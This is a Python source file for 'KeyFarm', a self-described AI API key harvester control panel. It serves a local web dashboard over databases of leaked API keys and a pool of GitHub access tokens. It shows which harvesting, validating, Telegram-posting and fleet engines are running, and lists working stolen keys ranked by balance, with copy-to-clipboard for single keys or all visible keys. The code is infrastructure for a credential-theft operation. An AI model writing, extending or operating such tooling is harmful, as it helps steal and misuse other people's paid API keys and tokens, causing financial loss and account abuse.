#!/usr/bin/env python3
"""KeyFarm Web Dashboard — single-file, zero-dep (stdlib http.server).

Serves a dark, live-updating control panel over the harvester:
  • engine status (parser / validator / extended / poster / DS-hunter / fleet)
  • token-pool + fleet-node counts
  • key stats by provider & status (from both DBs, read-only)
  • live keys table: provider, balance, models, source — worth-first

Run:  python dashboard.py            # http://127.0.0.1:8989
      python dashboard.py --port 9000
Reads only — never writes to the DBs. Safe to leave running.
"""
import json
import os
import sqlite3
import sys
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

PORT = 8989
for i, a in enumerate(sys.argv):
    if a == '--port':
        PORT = int(sys.argv[i + 1])

ROOT = Path(__file__).resolve().parent
# All paths overridable via env so the panel works in-repo and on a live box.
KH_DB = Path(os.environ.get('KF_DB', str(ROOT / 'data' / 'keys.db')))
GAS_DB = Path(os.environ.get('KF_GAS_DB', str(ROOT / 'leaked_keys.db')))
TOKENS = Path(os.environ.get('KF_TOKENS', str(ROOT / 'gh_tokens.txt')))
FLEET_STATE = Path(os.environ.get('KF_FLEET_STATE', str(ROOT / 'fleet_state.json')))
POOL_ALL = Path(os.environ.get('KF_POOL', str(ROOT / 'gh_pats_all.json')))

_cache = {'data': None, 'ts': 0}
LOCK = threading.Lock()
CACHE_TTL = 8


def _q(db, sql):
    try:
        c = sqlite3.connect(f'file:{db.as_posix()}?mode=ro', uri=True, timeout=5)
        rows = list(c.execute(sql))
        c.close()
        return rows
    except Exception:
        return []


def _engines():
    """Detect running engines via psutil cmdline scan (best-effort)."""
    names = {
        'eternal_v10': 'Parser (core)',
        'validator_v10': 'Validator',
        'main_optimized': 'Extended / API-scan',
        'key_poster': 'TG Poster',
        'dashscope_hunter': 'DashScope Hunter',
        'fleet_deploy': 'Fleet Deploy',
        'deploy_chain2': 'Fleet Chain',
        'recycler': 'Recycler',
    }
    found = {v: False for v in names.values()}
    try:
        import psutil
        for pr in psutil.process_iter(['name', 'cmdline']):
            try:
                cl = ' '.join(pr.info['cmdline'] or [])
                if 'python.exe' not in (pr.info['name'] or ''):
                    continue
                for k, v in names.items():
                    if k in cl:
                        found[v] = True
            except Exception:
                pass
    except Exception:
        pass
    return [{'name': v, 'up': found[v]} for v in names.values()]


def collect():
    now = time.time()
    with LOCK:
        if _cache['data'] and now - _cache['ts'] < CACHE_TTL:
            return _cache['data']

    data = {'ts': int(now)}

    # engines
    data['engines'] = _engines()

    # token pool + fleet
    pool = 0
    try:
        pool = len([l for l in TOKENS.read_text().splitlines() if l.strip().startswith('ghp_')])
    except Exception:
        pass
    pool_all = 0
    try:
        pool_all = len(json.load(open(POOL_ALL, encoding='utf-8')))
    except Exception:
        pass
    deployed = 0
    try:
        st = json.load(open(FLEET_STATE, encoding='utf-8'))
        deployed = sum(1 for v in st.values() if v.get('status') == 'deployed')
    except Exception:
        pass
    data['pool'] = {'active': pool, 'total': pool_all, 'fleet_nodes': deployed}

    # KeyHunter stats
    kh_status = _q(KH_DB, "SELECT status, COUNT(*) FROM keys GROUP BY status")
    kh_prov = _q(KH_DB, "SELECT prov, status, COUNT(*) FROM keys WHERE status IN ('WORKING','FREE','LIMITED') GROUP BY prov, status")
    data['kh'] = {'status': {k: v for k, v in kh_status},
                  'by_prov': [{'prov': p, 'status': s, 'n': n} for p, s, n in kh_prov],
                  'total': sum(v for _, v in kh_status)}

    # API-scan stats
    gas_status = _q(GAS_DB, "SELECT status, COUNT(*) FROM leaked_keys GROUP BY status")
    data['gas'] = {'status': {k: v for k, v in gas_status},
                   'total': sum(v for _, v in gas_status)}

    # live keys (worth-first): WORKING/FREE from KH + valid/confirmed from GAS
    live = []
    for prov, val, plan, price, rem, status in _q(KH_DB,
            "SELECT prov, val, plan, price, remaining, status FROM keys WHERE status IN ('WORKING','FREE') ORDER BY CASE status WHEN 'WORKING' THEN 0 ELSE 1 END LIMIT 400"):
        bal = price or rem or ''
        live.append({'prov': prov, 'key': val, 'plan': plan or '', 'bal': bal,
                     'status': status, 'src': 'core'})
    for plat, k, bal, url in _q(GAS_DB,
            "SELECT platform, api_key, balance_usd, source_url FROM leaked_keys WHERE status IN ('valid','confirmed') LIMIT 200"):
        live.append({'prov': plat.upper(), 'key': k, 'plan': '',
                     'bal': f'{bal}' if bal is not None else '', 'status': 'valid', 'src': 'extended',
                     'url': url or ''})
    data['live'] = live[:400]

    with LOCK:
        _cache['data'] = data
        _cache['ts'] = now
    return data


HTML = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>🔑 KeyFarm — Control Panel</title>
<style>
  :root{
    --bg:#0a0e14; --panel:#11161f; --panel2:#161c27; --border:#1f2937;
    --txt:#e6edf3; --dim:#8b98a9; --accent:#39d353; --accent2:#58a6ff;
    --warn:#e3b341; --bad:#f85149; --gold:#f0b429;
    --mono:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,monospace;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:var(--bg);color:var(--txt);font:14px/1.5 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    background-image:radial-gradient(circle at 15% 0%,rgba(57,211,83,.07),transparent 40%),radial-gradient(circle at 85% 100%,rgba(88,166,255,.06),transparent 40%);
    min-height:100vh}
  .wrap{max-width:1320px;margin:0 auto;padding:24px}
  header{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:24px}
  h1{font-size:22px;font-weight:700;letter-spacing:-.3px;display:flex;align-items:center;gap:10px}
  h1 .logo{font-size:26px}
  .sub{color:var(--dim);font-size:12px;margin-top:2px}
  .live-dot{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:var(--accent);font-weight:600}
  .live-dot::before{content:'';width:8px;height:8px;border-radius:50%;background:var(--accent);animation:pulse 1.6s infinite}
  @keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(57,211,83,.5)}50%{opacity:.6;box-shadow:0 0 0 6px rgba(57,211,83,0)}}
  .grid{display:grid;gap:16px}
  .stats{grid-template-columns:repeat(auto-fit,minmax(150px,1fr));margin-bottom:20px}
  .card{background:linear-gradient(180deg,var(--panel2),var(--panel));border:1px solid var(--border);border-radius:12px;padding:16px}
  .stat .v{font-size:30px;font-weight:800;letter-spacing:-1px;font-family:var(--mono)}
  .stat .l{color:var(--dim);font-size:11px;text-transform:uppercase;letter-spacing:.6px;margin-top:4px}
  .stat.green .v{color:var(--accent)} .stat.blue .v{color:var(--accent2)}
  .stat.gold .v{color:var(--gold)} .stat.dim .v{color:var(--dim)}
  .row{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px}
  @media(max-width:880px){.row{grid-template-columns:1fr}}
  .panel h2{font-size:13px;text-transform:uppercase;letter-spacing:.8px;color:var(--dim);margin-bottom:12px;display:flex;align-items:center;gap:8px}
  .eng{display:flex;flex-wrap:wrap;gap:8px}
  .chip{display:inline-flex;align-items:center;gap:7px;background:var(--panel);border:1px solid var(--border);
    border-radius:20px;padding:6px 13px;font-size:12.5px;font-weight:500}
  .chip .dot{width:7px;height:7px;border-radius:50%;background:var(--bad)}
  .chip.up{border-color:rgba(57,211,83,.35);background:rgba(57,211,83,.07)}
  .chip.up .dot{background:var(--accent);box-shadow:0 0 7px var(--accent)}
  .bar{display:flex;height:26px;border-radius:7px;overflow:hidden;background:var(--panel);margin-bottom:10px;font-size:11px}
  .bar div{display:flex;align-items:center;justify-content:center;color:#06110a;font-weight:700;min-width:2px;transition:width .5s}
  .legend{display:flex;flex-wrap:wrap;gap:14px;font-size:12px;color:var(--dim)}
  .legend span{display:inline-flex;align-items:center;gap:6px}
  .legend i{width:10px;height:10px;border-radius:3px;display:inline-block}
  table{width:100%;border-collapse:collapse;font-size:12.5px}
  th{text-align:left;color:var(--dim);font-weight:600;font-size:10.5px;text-transform:uppercase;letter-spacing:.6px;
    padding:9px 10px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--panel);cursor:pointer;user-select:none}
  th:hover{color:var(--txt)}
  td{padding:9px 10px;border-bottom:1px solid rgba(31,41,55,.5);vertical-align:middle}
  tr:hover td{background:rgba(88,166,255,.04)}
  .prov{font-weight:700;font-family:var(--mono);font-size:11.5px}
  .key{font-family:var(--mono);color:var(--accent2);font-size:11.5px;cursor:pointer;word-break:break-all}
  .key:hover{text-decoration:underline}
  .tag{display:inline-block;padding:2px 8px;border-radius:5px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.4px}
  .tag.WORKING,.tag.valid{background:rgba(57,211,83,.15);color:var(--accent)}
  .tag.FREE,.tag.confirmed{background:rgba(88,166,255,.15);color:var(--accent2)}
  .tag.LIMITED{background:rgba(227,179,65,.15);color:var(--warn)}
  .bal{font-family:var(--mono);font-weight:700}
  .bal.pos{color:var(--gold)} .bal.neg,.bal.zero{color:var(--dim)}
  .models{color:var(--dim);font-size:11px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
  .tablewrap{max-height:600px;overflow:auto;border:1px solid var(--border);border-radius:12px;background:var(--panel)}
  .toolbar{display:flex;gap:10px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
  input[type=text]{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:8px 12px;color:var(--txt);font-size:13px;min-width:220px;outline:none}
  input[type=text]:focus{border-color:var(--accent2)}
  .btn{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:8px 14px;color:var(--txt);font-size:12.5px;cursor:pointer;font-weight:600}
  .btn:hover{border-color:var(--accent2);color:var(--accent2)}
  .btn.active{background:rgba(88,166,255,.12);border-color:var(--accent2);color:var(--accent2)}
  .foot{color:var(--dim);font-size:11.5px;text-align:center;margin-top:24px}
  .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--accent);color:#06110a;
    padding:10px 20px;border-radius:8px;font-weight:700;font-size:13px;opacity:0;transition:opacity .3s;pointer-events:none}
  .toast.show{opacity:1}
  ::-webkit-scrollbar{width:9px;height:9px}::-webkit-scrollbar-thumb{background:var(--border);border-radius:5px}
  ::-webkit-scrollbar-thumb:hover{background:#2d3748}
</style>
</head>
<body>
<div class="wrap">
  <header>
    <div>
      <h1><span class="logo">🔑</span> KeyFarm <span class="live-dot" id="dot">LIVE</span></h1>
      <div class="sub">multi-source AI key harvester — control panel</div>
    </div>
    <div style="text-align:right">
      <div class="sub">last update <span id="ago">—</span></div>
      <div class="sub">auto-refresh 8s</div>
    </div>
  </header>

  <div class="grid stats" id="stats"></div>

  <div class="row">
    <div class="card panel">
      <h2>⚙️ Engines</h2>
      <div class="eng" id="engines"></div>
    </div>
    <div class="card panel">
      <h2>📊 Key status</h2>
      <div class="bar" id="statusbar"></div>
      <div class="legend" id="statuslegend"></div>
    </div>
  </div>

  <div class="card panel">
    <h2>🎯 Live keys <span id="livecount" style="color:var(--accent)"></span></h2>
    <div class="toolbar">
      <input type="text" id="search" placeholder="🔍 filter by provider / key / balance…">
      <button class="btn active" data-f="all">All</button>
      <button class="btn" data-f="WORKING">Working</button>
      <button class="btn" data-f="FREE">Free</button>
      <button class="btn" data-f="valid">Valid</button>
      <button class="btn" id="copyAll">⧉ Copy visible</button>
    </div>
    <div class="tablewrap">
      <table>
        <thead><tr>
          <th data-s="prov">Provider</th>
          <th data-s="status">Status</th>
          <th data-s="bal">Key</th>
          <th data-s="balnum">Balance</th>
          <th>Models / plan</th>
          <th data-s="src">Source</th>
        </tr></thead>
        <tbody id="rows"></tbody>
      </table>
    </div>
  </div>

  <div class="foot">KeyFarm · parser + validator + universal classifier + self-improve + fleet · read-only panel</div>
</div>
<div class="toast" id="toast">copied</div>

<script>
let DATA=null, FILTER='all', SORT='balnum', SORTDIR=-1;
const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];

function money(s){const m=String(s||'').match(/-?\d+\.?\d*/);return m?parseFloat(m[0]):null}
function mask(k){return k.length>22?k.slice(0,14)+'…'+k.slice(-4):k}
function toast(t){const e=$('#toast');e.textContent=t;e.classList.add('show');setTimeout(()=>e.classList.remove('show'),1400)}

function render(){
  if(!DATA)return;
  const kh=DATA.kh.status||{}, gas=DATA.gas.status||{};
  const working=(kh.WORKING||0)+(gas.valid||0)+(gas.confirmed||0);
  const free=(kh.FREE||0), limited=(kh.LIMITED||0);
  const dead=(kh.DEAD||0)+(gas.invalid||0)+(gas.dead||0);
  const total=DATA.kh.total+DATA.gas.total;

  $('#stats').innerHTML=[
    ['green',working,'Live keys'],
    ['blue',free,'Free-tier'],
    ['gold',DATA.pool.total,'Token pool'],
    ['blue',DATA.pool.fleet_nodes,'Fleet nodes'],
    ['dim',total,'Scanned'],
    ['dim',dead,'Dead'],
  ].map(([c,v,l])=>`<div class="card stat ${c}"><div class="v">${v.toLocaleString()}</div><div class="l">${l}</div></div>`).join('');

  $('#engines').innerHTML=DATA.engines.map(e=>
    `<div class="chip ${e.up?'up':''}"><span class="dot"></span>${e.name}</div>`).join('');

  const segs=[['WORKING','#39d353',working],['FREE','#58a6ff',free],['LIMITED','#e3b341',limited],['DEAD','#30363d',dead]];
  const sum=segs.reduce((a,s)=>a+s[2],0)||1;
  $('#statusbar').innerHTML=segs.filter(s=>s[2]>0).map(s=>
    `<div style="width:${s[2]/sum*100}%;background:${s[1]}" title="${s[0]}: ${s[2]}">${s[2]/sum>0.06?s[2]:''}</div>`).join('');
  $('#statuslegend').innerHTML=segs.map(s=>`<span><i style="background:${s[1]}"></i>${s[0]} ${s[2]}</span>`).join('');

  renderRows();
  const t=DATA.ts; $('#ago').textContent=new Date(t*1000).toLocaleTimeString();
}

function renderRows(){
  let rows=(DATA.live||[]).slice();
  const q=$('#search').value.toLowerCase().trim();
  if(FILTER!=='all')rows=rows.filter(r=>r.status===FILTER);
  if(q)rows=rows.filter(r=>(r.prov+' '+r.key+' '+r.bal+' '+r.plan).toLowerCase().includes(q));
  rows.forEach(r=>r._bal=money(r.bal));
  rows.sort((a,b)=>{
    let x,y;
    if(SORT==='balnum'){x=a._bal??-1e9;y=b._bal??-1e9}
    else{x=(a[SORT]||'').toString().toLowerCase();y=(b[SORT]||'').toString().toLowerCase()}
    return x<y?-SORTDIR:x>y?SORTDIR:0;
  });
  $('#livecount').textContent='('+rows.length+')';
  $('#rows').innerHTML=rows.map(r=>{
    const b=r._bal, bc=b==null?'':(b>0.5?'pos':(b<=0?'neg':'zero'));
    const bt=b==null?'—':(b<0?'-$'+Math.abs(b).toFixed(2):'$'+b.toFixed(2));
    const extra=(r.plan||'')+(r.url?` <a href="${r.url}" target="_blank" style="color:var(--dim)">↗</a>`:'');
    return `<tr>
      <td><span class="prov">${r.prov}</span></td>
      <td><span class="tag ${r.status}">${r.status}</span></td>
      <td><span class="key" data-k="${r.key}" title="click to copy">${mask(r.key)}</span></td>
      <td><span class="bal ${bc}">${bt}</span></td>
      <td class="models">${extra||'—'}</td>
      <td style="color:var(--dim);font-size:11px">${r.src}</td>
    </tr>`}).join('')||'<tr><td colspan=6 style="text-align:center;color:var(--dim);padding:30px">no keys match</td></tr>';
  $$('#rows .key').forEach(e=>e.onclick=()=>{navigator.clipboard.writeText(e.dataset.k);toast('key copied')});
}

async function load(){
  try{const r=await fetch('/api/state');DATA=await r.json();render();}
  catch(e){$('#dot').textContent='OFFLINE';$('#dot').style.color='var(--bad)'}
}
$('#search').oninput=renderRows;
$$('.btn[data-f]').forEach(b=>b.onclick=()=>{$$('.btn[data-f]').forEach(x=>x.classList.remove('active'));b.classList.add('active');FILTER=b.dataset.f;renderRows()});
$$('th[data-s]').forEach(th=>th.onclick=()=>{const s=th.dataset.s;if(SORT===s)SORTDIR*=-1;else{SORT=s;SORTDIR=1}renderRows()});
$('#copyAll').onclick=()=>{
  const keys=(DATA.live||[]).filter(r=>FILTER==='all'||r.status===FILTER).map(r=>r.key).join('\n');
  navigator.clipboard.writeText(keys);toast('copied '+keys.split('\n').length+' keys');
};
load();setInterval(load,8000);
</script>
</body>
</html>'''


class H(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def _send(self, code, body, ctype='application/json'):
        b = body if isinstance(body, bytes) else body.encode('utf-8')
        self.send_response(code)
        self.send_header('Content-Type', ctype + ('; charset=utf-8' if 'json' not in ctype else ''))
        self.send_header('Content-Length', str(len(b)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        if self.path in ('/', '/index.html'):
            self._send(200, HTML, 'text/html')
        elif self.path.startswith('/api/state'):
            try:
                self._send(200, json.dumps(collect()))
            except Exception as e:
                self._send(500, json.dumps({'error': str(e)}))
        elif self.path == '/healthz':
            self._send(200, '{"ok":true}')
        else:
            self._send(404, '{"error":"not found"}')


if __name__ == '__main__':
    srv = ThreadingHTTPServer(('127.0.0.1', PORT), H)
    print(f'🔑 KeyFarm dashboard → http://127.0.0.1:{PORT}')
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print('stopped')
